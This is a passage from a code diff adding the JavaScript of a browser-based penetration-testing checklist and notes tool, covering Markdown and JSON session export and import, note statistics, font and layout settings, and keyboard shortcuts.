+        return chip.classList.contains('checked') ? `[x] ${name}` : `[ ] ${name}`;
+      }).join(', ');
+      md += `- **${status} Step ${i+1}: ${s.title}**`;
+      if (toolStatus) md += ` — Tools: ${toolStatus}`;
+      if (hasNotes) md += ' [with notes]';
+      md += '\n';
+    });
+    md += '\n';
+  });
+  md += `**Overall:** ${overallDone}/${overallTotal} steps completed\n\n`;
+
+  // Tool Journey section
+  const toolMap = {};
+  ['networks','targets'].forEach(catKey => {
+    document.querySelectorAll(`#tab-${catKey} .step`).forEach((step, i) => {
+      const s = DATA[catKey][i];
+      step.querySelectorAll('.tool-chip').forEach(chip => {
+        if (!chip.classList.contains('checked')) return;
+        const name = chip.querySelector('.tool-name')?.textContent || '';
+        if (!toolMap[name]) toolMap[name] = [];
+        toolMap[name].push({ cat: catKey === 'networks' ? 'Redes' : 'Objetivos', step: i + 1, title: s.title });
+      });
+    });
+  });
+  const toolEntries = Object.entries(toolMap);
+  if (toolEntries.length > 0) {
+    md += `# Tool Journey\n\n`;
+    toolEntries.sort((a, b) => a[0].localeCompare(b[0])).forEach(([name, steps]) => {
+      const path = steps.map(s => `${s.cat} → Step ${s.step}: ${s.title}`).join(', ');
+      md += `- **${name}** — ${path}\n`;
+    });
+    md += '\n';
+  }
+
+  const blob = new Blob([md], { type: 'text/markdown' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `pentest-${sessionName.toLowerCase().replace(/[^a-z0-9]+/g,'-')}-${Date.now()}.md`;
+  a.click();
+  URL.revokeObjectURL(url);
+  showToast('Full report exported to Markdown');
+}
+
+/* ── Import ── */
+function importMD(event) {
+  const file = event.target.files[0];
+  if (!file) return;
+
+  if (!confirm('This will overwrite notes and tool states in the current session. Continue?')) {
+    event.target.value = '';
+    return;
+  }
+  saveCurrentToSession();
+
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    const content = e.target.result;
+    const sections = content.split(/(?=^# Category: )/m);
+    let totalNotes = 0;
+
+    sections.forEach(section => {
+      const catMatch = section.match(/^# Category: (.+)/m);
+      if (!catMatch) return;
+      const label = catMatch[1].trim();
+      const catKey = label === 'Redes' ? 'networks' : 'targets';
+      if (!catKey) return;
+      const steps = DATA[catKey];
+      const textareas = document.querySelectorAll(`#tab-${catKey} .step textarea`);
+
+      // Parse notes
+      const notes = [];
+      const noteRegex = /```\n?([\s\S]*?)```/g;
+      let match;
+      while ((match = noteRegex.exec(section)) !== null) {
+        const val = match[1].trim();
+        notes.push(val === '*No notes recorded*' ? '' : val.replace(/\\```/g, '```'));
+      }
+
+      // Parse tool states
+      const toolStates = [];
+      const stepRegex = /## Step \d+: .+?[\s\S]*?(?=## Step|---|$)/g;
+      let stepMatch;
+      while ((stepMatch = stepRegex.exec(section)) !== null) {
+        const stepBlock = stepMatch[0];
+        const toolsLine = stepBlock.match(/\*\*Tools:\*\* (.+)/);
+        if (toolsLine) {
+          const states = [];
+          toolsLine[1].split(',').forEach(t => {
+            const trimmed = t.trim();
+            if (trimmed.startsWith('[x]')) states.push(true);
+            else if (trimmed.startsWith('[ ]')) states.push(false);
+          });
+          toolStates.push(states);
+        }
+      }
+
+      textareas.forEach((ta, i) => {
+        if (i < notes.length) ta.value = notes[i];
+      });
+
+      updateNoteStats();
+
+      document.querySelectorAll(`#tab-${catKey} .step`).forEach((step, si) => {
+        if (si < toolStates.length) {
+          step.querySelectorAll('.tool-chip').forEach((chip, ti) => {
+            if (ti < toolStates[si].length) {
+              const checked = toolStates[si][ti];
+              chip.classList.toggle('checked', checked);
+              chip.querySelector('input[type="checkbox"]').checked = checked;
+            }
+          });
+        }
+      });
+
+      totalNotes += Math.min(notes.length, textareas.length);
+    });
+
+    if (totalNotes === 0) {
+      showToast('Could not parse notes. Make sure the file was exported by Hidr4lisk_Pentool.', true);
+    } else {
+      saveToStorage();
+      updateProgress('networks');
+      updateProgress('targets');
+      showToast(`Imported ${totalNotes} note block(s) from ${file.name}`);
+    }
+    event.target.value = '';
+  };
+  reader.readAsText(file);
+}
+
+function toggleHints() {
+  const el = document.getElementById('shortcutHints');
+  const toggle = el.querySelector('.hint-toggle');
+  const hints = el.querySelectorAll('.hint-group');
+  const hidden = hints[0]?.style.display === 'none';
+  hints.forEach(h => h.style.display = hidden ? '' : 'none');
+  toggle.textContent = hidden ? '− hide' : '+ show shortcuts';
+}
+
+/* ── Auto-resize textarea ── */
+function autoResizeTextarea(ta) {
+  ta.style.height = 'auto';
+  ta.style.height = ta.scrollHeight + 'px';
+}
+
+function autoResizeAllTextareas() {
+  document.querySelectorAll('.step textarea').forEach(autoResizeTextarea);
+}
+
+/* ── Note stats ── */
+function updateNoteStats() {
+  document.querySelectorAll('.step textarea').forEach(ta => {
+    const step = ta.closest('.step');
+    if (!step) return;
+    const idx = step.dataset.index;
+    const cat = step.dataset.category;
+    if (idx === undefined || !cat) return;
+    const el = document.getElementById(`stats-${cat}-${idx}`);
+    if (!el) return;
+    const val = ta.value;
+    const lines = val ? val.split('\n').length : 0;
+    const chars = val.length;
+    el.textContent = `${lines} lines · ${chars} chars`;
+    el.classList.toggle('dirty', chars > 0);
+  });
+}
+
+/* ── Session JSON export/import ── */
+function getFullSessionState() {
+  const sessions = getAllSessions();
+  const activeId = activeSessionId;
+  return {
+    version: 1,
+    exported: new Date().toISOString(),
+    activeSessionId: activeId,
+    sessions: sessions
+  };
+}
+
+function exportSessionJSON() {
+  const state = getFullSessionState();
+  const name = state.sessions[state.activeSessionId]?.name || 'session';
+  const blob = new Blob([JSON.stringify(state, null, 2)], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `hidralisk-pentool-session-${name.toLowerCase().replace(/[^a-z0-9]+/g,'-')}-${Date.now()}.json`;
+  a.click();
+  URL.revokeObjectURL(url);
+  showToast('Session data exported');
+}
+
+function importSessionJSON(event) {
+  const file = event.target.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    try {
+      const state = JSON.parse(e.target.result);
+      if (!state.version || !state.sessions) {
+        showToast('Invalid session file', true);
+        return;
+      }
+      const existing = getAllSessions();
+      let imported = 0;
+      Object.keys(state.sessions).forEach(id => {
+        if (!existing[id]) {
+          existing[id] = state.sessions[id];
+          imported++;
+        }
+      });
+      if (imported === 0) {
+        showToast('All sessions already exist', true);
+        event.target.value = '';
+        return;
+      }
+      saveAllSessions(existing);
+      if (state.activeSessionId && existing[state.activeSessionId]) {
+        activeSessionId = state.activeSessionId;
+        setActiveSessionId(state.activeSessionId);
+        loadSessionData(existing[state.activeSessionId].data);
+      } else {
+        const ids = Object.keys(existing);
+        activeSessionId = ids[0];
+        setActiveSessionId(ids[0]);
+        loadSessionData(existing[ids[0]].data);
+      }
+      renderSessionSelect();
+      updateNoteStats();
+      updateProgress('networks');
+      updateProgress('targets');
+      showToast(`Imported ${imported} session(s)`);
+    } catch(err) {
+      showToast('Failed to parse session file', true);
+    }
+    event.target.value = '';
+  };
+  reader.readAsText(file);
+}
+
+/* ── Auto-save on tab close ── */
+window.addEventListener('beforeunload', function() {
+  saveCurrentToSession();
+});
+
+function clearNotes() {
+  if (!confirm('Clear all notes and tool checkboxes for the current session?')) return;
+  document.querySelectorAll('.step textarea').forEach(ta => ta.value = '');
+  document.querySelectorAll('.tool-chip').forEach(chip => {
+    chip.classList.remove('checked');
+    chip.querySelector('input[type="checkbox"]').checked = false;
+  });
+  document.querySelectorAll('.trail-dot').forEach(d => d.classList.remove('used'));
+  saveToStorage();
+  updateNoteStats();
+  updateProgress('networks');
+  updateProgress('targets');
+  showToast('All notes and tool states cleared');
+}
+
+/* ── Tool stats overview ── */
+function updateToolStats() {
+  const container = document.getElementById('toolStats');
+  if (!container) return;
+  const allChips = document.querySelectorAll('.tool-chip');
+  let total = 0, used = 0;
+  const usedNames = new Set();
+  allChips.forEach(chip => {
+    total++;
+    if (chip.classList.contains('checked')) { used++; usedNames.add(chip.querySelector('.tool-name')?.textContent || ''); }
+  });
+  if (total === 0) { container.style.display = 'none'; return; }
+  container.style.display = '';
+  document.getElementById('toolStatsCount').textContent = `${used}/${total} used`;
+  const list = document.getElementById('toolStatsList');
+  const expanded = list.dataset.expanded === '1';
+  if (expanded) {
+    const allNames = [...new Set(Array.from(document.querySelectorAll('.tool-chip .tool-name')).map(el => el.textContent))].sort();
+    list.innerHTML = allNames.map(n => `<span class="${usedNames.has(n) ? 'used' : 'unused'}">${n}</span>`).join(', ');
+  } else {
+    list.innerHTML = '';
+  }
+  document.getElementById('toolStatsToggle').textContent = expanded ? '− collapse' : '+ expand';
+}
+
+function toggleToolStats() {
+  const list = document.getElementById('toolStatsList');
+  list.dataset.expanded = list.dataset.expanded === '1' ? '0' : '1';
+  updateToolStats();
+}
+
+/* ── Font Size Controls ── */
+const FONT_SIZE_KEY = 'hidr4lisk_pentool_font_size';
+const FONT_DEFAULT = 18;
+const FONT_MIN = 18;
+const FONT_MAX = 48;
+
+function getFontSize() {
+  return parseInt(localStorage.getItem(FONT_SIZE_KEY)) || FONT_DEFAULT;
+}
+
+function setFontSize(size) {
+  size = Math.max(FONT_MIN, Math.min(FONT_MAX, size));
+  document.documentElement.style.fontSize = size + 'px';
+  localStorage.setItem(FONT_SIZE_KEY, size);
+  const label = document.getElementById('fontSizeLabel');
+  if (label) label.textContent = size + 'px';
+}
+
+function changeFontSize(delta) {
+  const current = parseInt(document.documentElement.style.fontSize) || getFontSize();
+  setFontSize(current + delta);
+}
+
+function resetFontSize() {
+  setFontSize(FONT_DEFAULT);
+}
+
+document.getElementById('fontSizeLabel')?.addEventListener('click', resetFontSize);
+
+/* ── Layout Toggle ── */
+const LAYOUT_KEY = 'hidr4lisk_pentool_layout';
+
+function getLayout() {
+  return localStorage.getItem(LAYOUT_KEY) || 'single';
+}
+
+function setLayout(mode) {
+  localStorage.setItem(LAYOUT_KEY, mode);
+  document.querySelectorAll('.tab-content').forEach(tc => {
+    tc.classList.toggle('two-col', mode === 'two');
+  });
+  const btn = document.getElementById('layoutToggle');
+  if (btn) btn.textContent = mode === 'two' ? '⊟ 1-col' : '⊞ 2-col';
+}
+
+function toggleLayout() {
+  setLayout(getLayout() === 'two' ? 'single' : 'two');
+}
+
+/* ── Init ── */
+setFontSize(getFontSize());
+setLayout(getLayout());
+loadFromStorage();
+updateNoteStats();
+updateProgress('networks');
+updateProgress('targets');
+
+document.addEventListener('keydown', function(e) {
+  const mod = e.ctrlKey || e.metaKey;
+
+  if (mod && !e.shiftKey) {
+    if (e.key === '=' || e.key === '+') { e.preventDefault(); changeFontSize(1); return; }
+    if (e.key === '-') { e.preventDefault(); changeFontSize(-1); return; }
+    if (e.key === '0') { e.preventDefault(); resetFontSize(); return; }
+  }
+
+  if (!mod || !e.shiftKey) return;
+  if (e.key === 'E') { e.preventDefault(); exportMD(); }
+  if (e.key === 'I') { e.preventDefault(); document.getElementById('fileInput').click(); }
+  if (e.key === 'N') { e.preventDefault(); createSession(); }
+  if (e.key === 'R') { e.preventDefault(); renameSession(); }
+  if (e.key === 'D') { e.preventDefault(); deleteSession(); }
+  if (e.key === 'U') { e.preventDefault(); duplicateSession(); }
+  if (e.key === 'F') { e.preventDefault(); document.getElementById('searchInput').focus(); }
+  if (e.key === 'K') { e.preventDefault(); clearNotes(); }
+  if (e.key === 'G') { e.preventDefault(); toggleLayout(); }
+  if (e.key === 'Escape') {
+    closeAllExamples();
+  }
+});
+
+document.addEventListener('click', function(e) {
+  const pre = e.target.closest('.ex-content pre');
+  if (pre) return copyCommand(pre);
+  const header = e.target.closest('.step-header');
+  if (header) {
+    const step = header.closest('.step');
+    if (!step) return;
+    step.classList.toggle('collapsed');
+    if (step.classList.contains('collapsed')) {
+      const openPanel = step.querySelector('.tool-examples.open');
+      if (openPanel) closeAllExamples();
+    }
+    const arrow = step.querySelector('.collapse-arrow');
+    if (arrow) arrow.textContent = step.classList.contains('collapsed') ? '▶' : '▼';
+  }
+});
+</script>
+</body>
+</html>
